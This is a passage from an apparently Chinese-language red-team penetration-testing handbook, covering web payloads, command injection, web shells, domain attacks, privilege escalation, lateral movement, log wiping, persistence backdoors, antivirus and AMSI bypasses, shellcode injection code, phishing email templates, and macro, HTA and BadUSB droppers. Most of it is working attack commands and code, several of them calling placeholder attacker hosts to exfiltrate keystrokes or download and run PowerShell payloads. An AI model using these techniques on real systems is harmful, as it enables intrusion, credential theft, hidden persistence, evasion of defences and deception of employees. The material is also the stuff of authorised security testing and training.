document.onkeypress=function(e){
    new Image().src="http://attacker.com/log?k="+e.key;
}
</script>

<!-- ==================== DOM XSS ==================== -->

<!-- 常见 sink -->
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()

<!-- 测试 -->
http://target.com/page#<script>alert('XSS')</script>
http://target.com/page?search=<script>alert('XSS')</script>
```

### 8.4 命令注入

```bash
# ==================== 基本测试 ====================

# Linux
; id
| id
`id`
$(id)
; cat /etc/passwd
| cat /etc/passwd

# Windows
& whoami
| whoami
; dir

# 盲注（时间型）
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1

# 盲注（外带）
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com

# ==================== 绕过技术 ====================

# 空格绕过
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# 关键字绕过
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd

# 编码绕过
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

### 8.5 文件上传漏洞

```bash
# ==================== 绕过技术 ====================

# 1. 修改扩展名
shell.php.jpg
shell.php%00.jpg
shell.php;.jpg
shell.pHp
shell.php5
shell.phtml

# 2. 修改 Content-Type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# 3. 文件头绕过
GIF89a<?php system($_GET['cmd']); ?>

# 4. .htaccess 绕过
# 上传 .htaccess
AddType application/x-httpd-php .jpg

# 5. 双写绕过
shell.pphphp

# ==================== Web Shell ====================

# PHP
<?php system($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<?php @eval($_POST['ant']); ?>  # 蚁剑

# ASP
<%eval request("cmd")%>

# JSP
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### 8.6 SSRF 服务器端请求伪造

```bash
# ==================== 基本利用 ====================

# 内网探测
http://target.com/fetch?url=http://127.0.0.1:22
http://target.com/fetch?url=http://192.168.1.1
http://target.com/fetch?url=http://169.254.169.254  # AWS 元数据

# 文件读取
http://target.com/fetch?url=file:///etc/passwd

# 协议利用
http://target.com/fetch?url=dict://127.0.0.1:6379/info
http://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a...

# ==================== 绕过技术 ====================

# IP 绕过
http://127.0.0.1 → http://127.1
http://127.0.0.1 → http://0
http://127.0.0.1 → http://0.0.0.0
http://127.0.0.1 → http://[::1]
http://127.0.0.1 → http://127.0.0.1.nip.io

# 协议绕过
http:// → hTTp://
http:// → http:/
http:// → //

# DNS 重绑定
# 使用 rebind.network 等服务
```

---

## 9. 内网渗透

内网渗透是红队的核心技能，也是区分普通渗透测试和高级红队的关键。

### 9.1 内网信息收集

```bash
# ==================== Windows 内网信息收集 ====================

# 基本信息
systeminfo
hostname
whoami /all
net user
net localgroup administrators
net user /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain

# 网络信息
ipconfig /all
arp -a
route print
netstat -ano
net view
net view /domain

# 域信息
net config workstation
nltest /dclist:domain.com
nltest /domain_trusts

# 查找域控
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
net group "Domain Controllers" /domain

# ==================== Linux 内网信息收集 ====================

# 基本信息
uname -a
cat /etc/issue
id
cat /etc/passwd
cat /etc/shadow

# 网络信息
ifconfig -a
ip addr
arp -a
route -n
netstat -tulpn
cat /etc/hosts
cat /etc/resolv.conf

# 查找其他主机
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes"; done
```

### 9.2 内网代理与隧道

```bash
# ==================== 端口转发 ====================

# SSH 本地端口转发
ssh -L 8080:internal_host:80 user@jump_host
# 访问本地 8080 → 通过 jump_host → 到达 internal_host:80

# SSH 远程端口转发
ssh -R 8080:localhost:80 user@external_host
# 外部访问 external_host:8080 → 到达本地 80

# SSH 动态端口转发（SOCKS 代理）
ssh -D 1080 user@jump_host
# 配置浏览器使用 SOCKS5 代理 127.0.0.1:1080

# ==================== Chisel ====================

# 服务端（攻击机）
chisel server -p 8080 --reverse

# 客户端（目标机）
chisel client attacker:8080 R:socks

# ==================== frp ====================

# 服务端配置 (frps.ini)
[common]
bind_port = 7000

# 客户端配置 (frpc.ini)
[common]
server_addr = attacker_ip
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5

# ==================== Proxychains ====================

# 配置 /etc/proxychains4.conf
socks5 127.0.0.1 1080

# 使用
proxychains nmap -sT -Pn 192.168.2.0/24
proxychains curl http://internal.target.com

# ==================== Metasploit 路由 ====================

# 添加路由
meterpreter > run autoroute -s 192.168.2.0/24

# 或在 MSF 控制台
msf6 > route add 192.168.2.0/24 1

# 设置 SOCKS 代理
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
```

### 9.3 域渗透基础

```bash
# ==================== 域环境理解 ====================

# 域 (Domain)
# - 集中管理的网络环境
# - 域控制器 (DC) 是核心
# - 所有用户和计算机都加入域

# 关键概念
# - 域控制器 (Domain Controller)
# - 活动目录 (Active Directory)
# - LDAP (轻量目录访问协议)
# - Kerberos (认证协议)
# - NTLM (认证协议)
# - GPO (组策略对象)

# ==================== 域信息收集 ====================

# PowerView (PowerSploit)
Import-Module PowerView.ps1

# 域信息
Get-Domain
Get-DomainController
Get-DomainPolicy

# 用户信息
Get-DomainUser
Get-DomainUser -Identity admin
Get-DomainUser -SPN                      # Kerberoastable 用户

# 组信息
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# 计算机信息
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"

# 共享信息
Find-DomainShare
Find-InterestingDomainShareFile

# ==================== BloodHound ====================

# 收集数据
# SharpHound.exe
.\SharpHound.exe -c All

# SharpHound.ps1
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# 导入 BloodHound
# 启动 neo4j 和 BloodHound
# 上传 zip 文件
# 分析攻击路径
```

### 9.4 域攻击技术

```bash
# ==================== Kerberoasting ====================

# 原理：请求服务票据，离线破解服务账户密码

# Impacket
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# 破解
hashcat -m 13100 hashes.txt wordlist.txt
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt

# ==================== AS-REP Roasting ====================

# 原理：针对不需要预认证的用户

# Impacket
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# 破解
hashcat -m 18200 hashes.txt wordlist.txt

# ==================== Pass-the-Hash ====================

# 原理：使用 NTLM 哈希进行认证

# Impacket
psexec.py -hashes :NTLM_HASH domain/user@target
wmiexec.py -hashes :NTLM_HASH domain/user@target
smbexec.py -hashes :NTLM_HASH domain/user@target

# Mimikatz
sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd

# ==================== Pass-the-Ticket ====================

# 导出票据
mimikatz # sekurlsa::tickets /export

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi

# ==================== Golden Ticket ====================

# 原理：伪造 TGT，需要 krbtgt 哈希

# 获取 krbtgt 哈希（需要域管权限）
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# 创建 Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# ==================== DCSync ====================

# 原理：模拟域控复制，获取所有用户哈希

# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.com /all /csv

# Impacket
secretsdump.py domain/admin:password@DC_IP
secretsdump.py -hashes :HASH domain/admin@DC_IP
```

---

## 10. 权限提升

### 10.1 Windows 提权

```bash
# ==================== 信息收集 ====================

# 系统信息
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# 补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 当前权限
whoami /priv
whoami /groups

# 服务信息
wmic service get name,displayname,pathname,startmode
sc query

# 计划任务
schtasks /query /fo LIST /v

# ==================== 常见提权方法 ====================

# 1. 内核漏洞提权
# 使用 Windows-Exploit-Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# 常见内核漏洞
# MS16-032, MS15-051, MS14-058, MS11-046

# 2. 服务配置错误

# 不安全的服务权限
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc config vulnerable_service binpath= "C:\shell.exe"
sc start vulnerable_service

# 未引用的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# 如果路径是 C:\Program Files\My App\service.exe
# 可以放置 C:\Program.exe 或 C:\Program Files\My.exe

# 3. DLL 劫持
# 查找可写目录中的 DLL 加载
procmon.exe  # 监控 DLL 加载

# 4. AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 如果都为 1，可以用 msi 提权
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# 5. 令牌模拟
# Meterpreter
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"

# 6. Potato 系列
# JuicyPotato, RoguePotato, PrintSpoofer, GodPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\shell.exe" -t *
PrintSpoofer.exe -i -c cmd

# ==================== 自动化工具 ====================

# WinPEAS
winPEASany.exe

# PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks

# BeRoot
beRoot.exe
```

### 10.2 Linux 提权

```bash
# ==================== 信息收集 ====================

# 系统信息
uname -a
cat /etc/issue
cat /etc/*-release

# 当前用户
id
whoami
sudo -l

# SUID 文件
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 可写文件
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# 定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# 进程
ps aux
ps aux | grep root

# 网络
netstat -tulpn
ss -tulpn

# ==================== 常见提权方法 ====================

# 1. 内核漏洞
# 使用 Linux-Exploit-Suggester
./linux-exploit-suggester.sh

# 常见内核漏洞
# Dirty COW (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
# PwnKit (CVE-2021-4034)

# 2. SUID 提权
# 查找 SUID 文件
find / -perm -4000 2>/dev/null

# GTFOBins 利用
# https://gtfobins.github.io/

# 示例：find
find . -exec /bin/sh -p \; -quit

# 示例：vim
vim -c ':!/bin/sh'

# 示例：python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 3. Sudo 提权
sudo -l

# 示例：vim
sudo vim -c ':!/bin/sh'

# 示例：find
sudo find . -exec /bin/sh \; -quit

# 示例：awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 4. Capabilities 提权
getcap -r / 2>/dev/null

# 示例：python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 5. 定时任务提权
# 查找可写的定时任务脚本
cat /etc/crontab
ls -la /etc/cron.*

# 如果脚本可写
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh
# 等待执行后
/tmp/bash -p

# 6. 环境变量提权
# PATH 劫持
echo '/bin/bash' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# 运行调用 service 的 SUID 程序

# 7. NFS 提权
# 查看 NFS 配置
cat /etc/exports
# 如果有 no_root_squash
# 在攻击机挂载并创建 SUID 文件

# ==================== 自动化工具 ====================

# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 2
```

---

## 11. 横向移动

### 11.1 Windows 横向移动

```bash
# ==================== 凭证获取 ====================

# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords      # 内存中的密码
mimikatz # sekurlsa::wdigest             # WDigest 密码
mimikatz # lsadump::sam                  # SAM 数据库
mimikatz # lsadump::dcsync /all          # DCSync

# Meterpreter
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all

# ==================== 远程执行 ====================

# PsExec
psexec.py domain/user:password@target cmd.exe
psexec.py -hashes :HASH domain/user@target

# WMIExec
wmiexec.py domain/user:password@target
wmiexec.py -hashes :HASH domain/user@target

# SMBExec
smbexec.py domain/user:password@target
smbexec.py -hashes :HASH domain/user@target

# ATExec (计划任务)
atexec.py domain/user:password@target "whoami"

# WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H HASH

# DCOM
dcomexec.py domain/user:password@target

# ==================== RDP ====================

# 启用 RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service remotedesktop enable

# RDP 连接
xfreerdp /u:user /p:password /v:target
rdesktop -u user -p password target

# Pass-the-Hash RDP (需要 Restricted Admin 模式)
xfreerdp /u:user /pth:HASH /v:target

# ==================== 文件传输 ====================

# SMB
copy \\target\C$\file.txt C:\local\
copy C:\local\file.txt \\target\C$\

# PowerShell
Invoke-WebRequest -Uri http://attacker/file -OutFile C:\file
(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\file')

# Certutil
certutil -urlcache -split -f http://attacker/file C:\file

# Bitsadmin
bitsadmin /transfer job /download /priority high http://attacker/file C:\file
```

### 11.2 Linux 横向移动

```bash
# ==================== SSH ====================

# 密码登录
ssh user@target

# 密钥登录
ssh -i id_rsa user@target

# 代理跳转
ssh -J jump_host user@target

# ==================== 凭证获取 ====================

# 密码哈希
cat /etc/shadow

# SSH 密钥
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# 历史命令
cat ~/.bash_history
cat ~/.zsh_history

# 配置文件
cat /etc/passwd
cat ~/.bashrc
cat ~/.profile

# ==================== 远程执行 ====================

# SSH 命令执行
ssh user@target "whoami"

# SSH 批量执行
for host in $(cat hosts.txt); do
    ssh user@$host "whoami"
done

# ==================== 文件传输 ====================

# SCP
scp file user@target:/path/
scp user@target:/path/file ./

# rsync
rsync -avz file user@target:/path/

# nc
# 接收端
nc -lvp 4444 > file
# 发送端
nc target 4444 < file
```

### 11.3 横向移动检测规避

```bash
# ==================== 规避技术 ====================

# 1. 使用合法工具
# - PowerShell Remoting
# - WMI
# - PsExec (Sysinternals)

# 2. 时间规避
# - 在工作时间执行
# - 避免大量并发连接

# 3. 流量混淆
# - 使用 HTTPS
# - 使用 DNS 隧道
# - 使用合法端口 (80, 443)

# 4. 日志清理
# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux
echo > /var/log/auth.log
echo > /var/log/syslog
history -c

# 5. 进程注入
# 注入到合法进程中执行
```

---

## 12. 持久化技术

### 12.1 Windows 持久化

```bash
# ==================== 注册表 ====================

# Run 键
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# RunOnce 键
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Winlogon
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe"

# ==================== 计划任务 ====================

# 创建计划任务
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
schtasks /create /tn "Backup" /tr "C:\backdoor.exe" /sc daily /st 09:00

# PowerShell
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger

# ==================== 服务 ====================

# 创建服务
sc create backdoor binPath= "C:\backdoor.exe" start= auto
sc start backdoor

# PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\backdoor.exe" -StartupType Automatic

# ==================== WMI 事件订阅 ====================

# PowerShell
$filterName = 'BotFilter'
$consumerName = 'BotConsumer'
$command = 'C:\backdoor.exe'

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $WMIEventFilter
    Consumer = $WMIEventConsumer
}

# ==================== DLL 劫持 ====================

# 查找可劫持的 DLL
# 使用 Process Monitor 监控 DLL 加载
# 将恶意 DLL 放置在搜索路径中

# ==================== COM 劫持 ====================

# 修改 COM 对象指向恶意 DLL
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\evil.dll"

# ==================== 启动文件夹 ====================

# 用户启动文件夹
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

# 系统启动文件夹
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
```

### 12.2 Linux 持久化

```bash
# ==================== SSH 密钥 ====================

# 添加公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ==================== Cron 任务 ====================

# 用户 cron
crontab -e
# 添加：* * * * * /path/to/backdoor

# 系统 cron
echo "* * * * * root /path/to/backdoor" >> /etc/crontab

# cron.d
echo "* * * * * root /path/to/backdoor" > /etc/cron.d/backdoor

# ==================== 系统服务 ====================

# systemd 服务
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
ExecStart=/path/to/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor

# ==================== 启动脚本 ====================

# rc.local
echo "/path/to/backdoor &" >> /etc/rc.local

# init.d
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
/path/to/backdoor &
EOF
chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults

# ==================== Shell 配置 ====================

# .bashrc
echo "/path/to/backdoor &" >> ~/.bashrc

# .profile
echo "/path/to/backdoor &" >> ~/.profile

# /etc/profile
echo "/path/to/backdoor &" >> /etc/profile

# ==================== 后门用户 ====================

# 添加 root 权限用户
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# 隐藏用户（UID < 1000）
useradd -o -u 0 -g 0 backdoor

# ==================== SUID 后门 ====================

# 复制 bash 并设置 SUID
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor
# 使用：/tmp/.backdoor -p

# ==================== LD_PRELOAD ====================

# 创建恶意共享库
# evil.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

# 编译
gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles

# 设置环境变量
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

---

## 13. 免杀与对抗

### 13.1 免杀基础

```
┌─────────────────────────────────────────────────────────────────┐
│                    杀毒软件检测原理                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 静态检测                                                   │
│      ├── 特征码匹配：匹配已知恶意代码特征                       │
│      ├── 哈希检测：文件哈希黑名单                               │
│      └── 启发式检测：分析代码结构和行为模式                     │
│                                                                 │
│   2. 动态检测                                                   │
│      ├── 沙箱分析：在隔离环境中运行分析                         │
│      ├── 行为监控：监控 API 调用、文件操作等                    │
│      └── 内存扫描：扫描进程内存中的恶意代码                     │
│                                                                 │
│   3. 云查杀                                                     │
│      ├── 云端特征库：实时更新的特征库                           │
│      └── 大数据分析：基于大量样本的机器学习                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 13.2 静态免杀

```bash
# ==================== 编码混淆 ====================

# MSFvenom 编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT \
    -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# 多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT \
    -e x86/shikata_ga_nai -i 5 -f raw | \
    msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f exe -o payload.exe

# ==================== 加壳 ====================

# UPX 加壳
upx -9 payload.exe

# 商业壳
# VMProtect, Themida, Enigma Protector

# ==================== 代码混淆 ====================

# PowerShell 混淆
# Invoke-Obfuscation
Import-Module Invoke-Obfuscation.psd1
Invoke-Obfuscation

# 字符串混淆
$cmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d2hvYW1p"))
Invoke-Expression $cmd

# ==================== 签名伪造 ====================

# 使用合法签名
# SigThief - 复制签名
python sigthief.py -i legitimate.exe -t payload.exe -o signed_payload.exe
```

### 13.3 动态免杀

```c
// ==================== 沙箱检测 ====================

#include <windows.h>

// 检测虚拟机
BOOL IsVM() {
    // 检查 VMware
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // 检查进程数
    DWORD processCount = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            processCount++;
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    // 沙箱通常进程较少
    if (processCount < 50) return TRUE;
    
    return FALSE;
}

// 延时执行
void DelayExecution() {
    // 长时间延时
    Sleep(300000);  // 5分钟
    
    // 或者检测时间
    DWORD start = GetTickCount();
    Sleep(10000);
    DWORD end = GetTickCount();
    
    // 沙箱可能加速时间
    if ((end - start) < 9000) {
        ExitProcess(0);
    }
}

// 用户交互检测
BOOL HasUserInteraction() {
    POINT pt1, pt2;
    GetCursorPos(&pt1);
    Sleep(5000);
    GetCursorPos(&pt2);
    
    // 鼠标没有移动可能是沙箱
    if (pt1.x == pt2.x && pt1.y == pt2.y) {
        return FALSE;
    }
    return TRUE;
}

// ==================== API 混淆 ====================

// 动态获取 API
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

void ExecuteShellcode(unsigned char* shellcode, size_t size) {
    // 动态获取函数地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    
    // 执行
    LPVOID mem = myVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, size);
    ((void(*)())mem)();
}

// ==================== 进程注入 ====================

// 注入到合法进程
BOOL InjectToProcess(DWORD pid, unsigned char* shellcode, size_t size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    CloseHandle(hProcess);
    return TRUE;
}
```

### 13.4 AMSI 绕过

```powershell
# ==================== AMSI 绕过技术 ====================

# 方法1：内存补丁
$a = [Ref].Assembly.GetTypes() | ForEach-Object {
    if ($_.Name -like "*iUtils") { $_ }
}
$b = $a.GetFields('NonPublic,Static') | ForEach-Object {
    if ($_.Name -like "*Context") { $_ }
}
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# 方法2：反射
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法3：混淆绕过
$a = 'System.Management.Automation.A]'+'msiUtils'
$b = 'amsiInitFailed'
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)

# 方法4：PowerShell 降级
powershell -version 2 -command "..."
```

### 13.5 EDR 绕过

```bash
# ==================== EDR 绕过技术 ====================

# 1. 直接系统调用
# 绕过用户态 Hook，直接调用内核

# 2. 进程空洞化 (Process Hollowing)
# 创建挂起进程，替换内存，恢复执行

# 3. DLL 侧加载
# 利用合法程序加载恶意 DLL

# 4. 父进程欺骗
# 伪造父进程 PID

# 5. ETW 绕过
# 禁用 Event Tracing for Windows

# 6. 内存加载
# 不落地执行，直接在内存中加载

# 工具
# - SysWhispers: 生成直接系统调用代码
# - Donut: 将 .NET 程序转换为 shellcode
# - Scarecrow: EDR 绕过框架
```

---

## 14. 社会工程学

### 14.1 社工基础

```
┌─────────────────────────────────────────────────────────────────┐
│                    社会工程学攻击类型                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 钓鱼攻击 (Phishing)                                        │
│      ├── 邮件钓鱼：伪造邮件诱导点击                             │
│      ├── 鱼叉式钓鱼：针对特定目标的定制钓鱼                     │
│      ├── 克隆钓鱼：复制合法邮件修改链接                         │
│      └── 语音钓鱼：电话诈骗                                     │
│                                                                 │
│   2. 伪装攻击 (Pretexting)                                      │
│      ├── 冒充 IT 支持                                           │
│      ├── 冒充供应商                                             │
│      └── 冒充高管                                               │
│                                                                 │
│   3. 诱饵攻击 (Baiting)                                         │
│      ├── USB 投放                                               │
│      └── 恶意下载                                               │
│                                                                 │
│   4. 尾随攻击 (Tailgating)                                      │
│      └── 跟随授权人员进入受限区域                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 14.2 钓鱼攻击

```bash
# ==================== 钓鱼邮件 ====================

# GoPhish 钓鱼平台
# 安装
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# 访问 https://localhost:3333
# 默认账号：admin / gophish

# ==================== 钓鱼页面 ====================

# 克隆网站
wget -mk -nH http://target.com/login

# 使用 SET (Social Engineering Toolkit)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# ==================== 恶意文档 ====================

# Office 宏
# 创建包含恶意宏的文档
Sub AutoOpen()
    Shell "powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
End Sub

# HTA 文件
<html>
<head>
<script language="VBScript">
Sub RunProgram
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
End Sub
RunProgram
</script>
</head>
</html>

# ==================== 钓鱼邮件模板 ====================

# 密码重置
Subject: [紧急] 您的账户密码即将过期

尊敬的用户，

您的账户密码将在24小时内过期。请点击以下链接立即重置密码：

[重置密码](http://phishing-site.com/reset)

如果您没有请求重置密码，请忽略此邮件。

IT 支持团队

# 发票/订单
Subject: 您的订单已发货 - 订单号 #12345

尊敬的客户，

您的订单已发货，请查看附件中的发票详情。

[查看发票](http://phishing-site.com/invoice)

感谢您的购买！

# 安全警告
Subject: [安全警告] 检测到异常登录

我们检测到您的账户存在异常登录活动：

时间：2024-01-15 10:30:00
位置：俄罗斯
设备：未知设备

如果这不是您本人操作，请立即点击以下链接验证身份：

[验证身份](http://phishing-site.com/verify)
```

### 14.3 USB 攻击

```bash
# ==================== Rubber Ducky ====================

# Ducky Script 示例
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER

# ==================== BadUSB ====================

# 使用 Arduino 模拟键盘
# 安装 Keyboard 库
#include <Keyboard.h>

void setup() {
    Keyboard.begin();
    delay(1000);
    
    // 打开运行
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);
    
    // 输入命令
    Keyboard.print("powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    Keyboard.end();
}

void loop() {}

# ==================== USB 投放 ====================

# 准备诱饵 USB
# 1. 创建诱人的文件名
#    - 工资表.xlsx
#    - 机密文件.docx
#    - 员工照片.exe (伪装图标)

# 2. 使用 autorun (旧系统)
# autorun.inf
[autorun]
open=payload.exe
icon=folder.ico
```

---

## 15. 物理安全

### 15.1 物理渗透

```
┌─────────────────────────────────────────────────────────────────┐
│                    物理安全测试范围                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 门禁系统                                                   │
│      ├── RFID 卡克隆                                            │
│      ├── 门锁撬开                                               │
│      └── 尾随进入                                               │
│                                                                 │
│   2. 网络接入                                                   │
│      ├── 寻找开放网口                                           │
│      ├── 无线网络攻击                                           │
│      └── 网络设备物理访问                                       │
│                                                                 │
